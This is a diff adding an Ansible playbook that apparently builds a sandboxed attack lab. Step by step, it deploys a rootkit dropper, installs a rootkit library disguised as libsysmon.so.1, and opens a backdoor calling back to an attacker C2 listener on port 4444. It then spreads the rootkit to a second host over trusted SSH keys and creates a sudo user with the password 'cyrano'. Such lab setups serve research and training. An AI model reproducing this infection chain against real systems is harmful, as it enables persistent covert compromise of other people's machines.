@@ -1,0 +1,213 @@
+---
+- name: disable qxl
+  hosts:
+    - routers
+    - hosts
+  gather_facts: yes
+  become: yes
+  tasks:
+    - include_role:
+        name: disable-qxl
+      when: ansible_os_family == 'Debian'
+
+
+- name: set up victim
+  hosts: victim
+  become: yes
+  roles:
+    - name: victim
+    - name: user-access
+      user_access_username: cyrano
+      user_access_password: cyrano
+      user_access_sudo: True
+
+
+- name: set up victim2
+  hosts: victim2
+  become: yes
+  roles:
+    - name: victim2
+
+
+- name: set up attacker
+  hosts: attacker
+  become: yes
+  roles:
+    - name: attacker-server
+    - name: user-access
+      user_access_username: cyrano
+      user_access_password: cyrano
+      user_access_sudo: True
+
+
+- name: Generate SSH key on victim and trust victim2
+  hosts: victim
+  become: yes
+  roles:
+    - role: ssh_access
+      vars:
+        ssh_user: cyrano
+        ssh_scan_hosts:
+          - victim2
+
+
+- name: Generate SSH key on victim2 and trust victim
+  hosts: victim2
+  become: yes
+  roles:
+    - role: ssh_access
+      vars:
+        ssh_user: cyrano
+        ssh_scan_hosts:
+          - victim
+
+
+- name: Authorize victim key on victim2
+  hosts: victim2
+  become: yes
+  tasks:
+    - name: Ensure cyrano user exists
+      user:
+        name: cyrano
+        shell: /bin/bash
+        state: present
+
+    - name: Ensure .ssh directory exists for cyrano
+      file:
+        path: /home/cyrano/.ssh
+        state: directory
+        owner: cyrano
+        group: cyrano
+        mode: "0700"
+
+    - name: Add victim public key to victim2
+      authorized_key:
+        user: cyrano
+        key: "{{ hostvars['victim'].ssh_public_key_decoded }}"
+        state: present
+
+
+- name: Authorize victim2 key on victim
+  hosts: victim
+  become: yes
+  tasks:
+    - name: Ensure cyrano user exists
+      user:
+        name: cyrano
+        shell: /bin/bash
+        state: present
+
+    - name: Ensure .ssh directory exists for cyrano
+      file:
+        path: /home/cyrano/.ssh
+        state: directory
+        owner: cyrano
+        group: cyrano
+        mode: "0700"
+
+    - name: Add victim2 public key to victim
+      authorized_key:
+        user: cyrano
+        key: "{{ hostvars['victim2'].ssh_public_key_decoded }}"
+        state: present
+
+
+- name: Deploy dropper artifacts on victim
+  hosts: victim
+  become: yes
+  roles:
+    - role: rootkit-dropper
+      vars:
+        username: cyrano
+        attacker_ip: "192.168.40.5"
+
+
+- name: Compile and install rootkit on victim
+  hosts: victim
+  become: yes
+  roles:
+    - role: rootkit-installer
+      vars:
+        username: cyrano
+        attacker_host: attacker
+        compile_library: true
+
+
+- name: Fetch compiled rootkit library from victim
+  hosts: victim
+  become: yes
+  tasks:
+    - name: Read compiled rootkit library
+      slurp:
+        src: /lib/x86_64-linux-gnu/libsysmon.so.1
+      register: rootkit_lib
+
+
+- name: Deploy rootkit backdoor on victim
+  hosts: victim
+  become: yes
+  roles:
+    - role: rootkit-backdoor
+      vars:
+        username: cyrano
+        attacker_host: attacker
+        attacker_port: 4444
+        worker_id: "victim-1"
+
+
+- name: Start C2 listener on attacker
+  hosts: attacker
+  become: yes
+  roles:
+    - role: attacker-c2
+      vars:
+        listen_port: 4444
+
+
+- name: Deploy rootkit spreader on victim
+  hosts: victim
+  become: yes
+  roles:
+    - role: rootkit-spreader
+      vars:
+        username: cyrano
+        target_host: victim2
+        target_user: cyrano
+
+
+- name: Deploy rootkit library on victim2 (spread result)
+  hosts: victim2
+  become: yes
+  pre_tasks:
+    - name: Copy rootkit library from victim
+      copy:
+        dest: /lib/x86_64-linux-gnu/libsysmon.so.1
+        content: "{{ hostvars['victim'].rootkit_lib.content | b64decode }}"
+        owner: root
+        group: root
+        mode: "0755"
+  roles:
+    - role: rootkit-installer
+      vars:
+        username: cyrano
+        attacker_host: attacker
+        compile_library: false
+
+- name: Deploy rootkit backdoor on victim2
+  hosts: victim2
+  become: yes
+  roles:
+    - role: rootkit-backdoor
+      vars:
+        username: cyrano
+        attacker_host: attacker
+        attacker_port: 4444
+        worker_id: "victim-2"
+
+
+- name: set up command logging
+  hosts: hosts
+  become: yes
+  roles:
+    - role: sandbox-logging
+      slf_destination_port: '{% if hostvars["man"] is defined -%} 514 {%- else -%} 515 {%- endif %}'
